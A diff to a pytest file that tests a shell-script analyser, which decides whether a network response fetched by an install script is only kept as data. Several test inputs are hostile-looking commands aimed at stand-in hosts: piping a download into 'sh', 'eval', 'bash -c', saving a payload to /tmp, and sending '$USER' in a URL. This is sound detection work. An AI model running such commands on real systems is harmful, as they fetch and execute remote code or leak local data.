@@ -2,7 +2,12 @@
 
 import pytest
 
-from kitsunox.lang.shell import mask_script_messages, only_prints, print_only_functions
+from kitsunox.lang.shell import (
+    fetched_as_data,
+    mask_script_messages,
+    only_prints,
+    print_only_functions,
+)
 
 NEOCORTEX = """\
 ok() { echo -e "  ${GREEN}${SYM_OK}${NC} $1"; }
@@ -86,3 +91,75 @@ def test_function_without_a_closing_brace_in_reach_is_not_a_printer() -> None:
 def test_powershell_function() -> None:
     text = 'function Write-Info($m) {\n    Write-Host "  $m" -ForegroundColor Cyan\n}\n'
     assert print_only_functions(text) == {"write-info"}
+
+
+TRACK = """\
+#!/bin/bash
+INSTALLATION_ID=$(curl -s 'https://www.uuidgen.example/api/version4')
+os="linux"
+track() {
+  DATA='{
+    "anonymousId":"'"$INSTALLATION_ID"'",
+    "event": "kx.install.'"$1"'",
+    "properties": { "os": "'"$os"'"}
+  }'
+  URL="https://analytics.kx.example/v1/track"
+  if [ -n "$INSTALLATION_ID" ]; then
+    curl -sfL -d "$DATA" --header "Content-Type: application/json" "$URL" > /dev/null 2>&1
+  else
+    wget -q --post-data="$DATA" "$URL" > /dev/null 2>&1
+  fi
+}
+track "$1"
+"""
+
+
+def test_a_response_kept_only_as_data() -> None:
+    """`@lightdash/cli`'s `track.sh` (round 9 Q1): a UUID fetched into a variable, put into a
+    JSON body and sent with `curl -d` / `wget --post-data`; nothing fetched runs or is saved."""
+    assert fetched_as_data(TRACK, TRACK.index("https://www.uuid"))
+    assert not fetched_as_data(TRACK, TRACK.index("https://analytics"))  # not a capture
+
+
+@pytest.mark.parametrize(
+    "after",
+    [
+        'eval "$INSTALLATION_ID"',
+        "$INSTALLATION_ID --run",
+        'echo "$INSTALLATION_ID" | sh',
+        'printf "%s" "$INSTALLATION_ID" > /tmp/x.sh',
+        'CMD="$INSTALLATION_ID"\nbash -c "$CMD"',
+        'run_it "$INSTALLATION_ID"',  # handed to a function the rule doesn't follow
+        'curl -sfL -o /tmp/x "https://dl.example/$INSTALLATION_ID"',  # part of another URL
+        'URL2="https://x.example/$INSTALLATION_ID"\ncurl -s "$URL2" | sh',
+        'curl -s -d x "$INSTALLATION_ID"',  # the URL of a request, not its data
+    ],
+)
+def test_a_response_that_runs_or_is_saved(after: str) -> None:
+    text = TRACK + after + "\n"
+    assert not fetched_as_data(text, text.index("https://www.uuid"))
+
+
+@pytest.mark.parametrize(
+    "capture",
+    [
+        "ID=$(curl -sSLo /tmp/id https://x.example/id)",  # saved to a file
+        "ID=$(curl -s --output /tmp/id https://x.example/id)",
+        "ID=$(wget -q https://x.example/id)",  # wget saves a file unless `-O -`
+        'ID=$(curl -s "https://x.example/id?u=$USER")',  # sends local data in the URL
+        "ID=$(curl -s https://x.example/id | sh)",
+        "curl -s https://x.example/id",  # not captured
+    ],
+)
+def test_captures_that_are_not_data_only(capture: str) -> None:
+    text = capture + "\n"
+    assert not fetched_as_data(text, text.index("https://"))
+
+
+@pytest.mark.parametrize(
+    "capture",
+    ['ID="$(wget -qO- https://x.example/id)"', "local ID=$(wget -q -O - https://x.example/id)"],
+)
+def test_wget_to_stdout_and_a_test(capture: str) -> None:
+    text = capture + '\nif [[ -z "$ID" ]]; then exit 0; fi\n'
+    assert fetched_as_data(text, text.index("https://"))
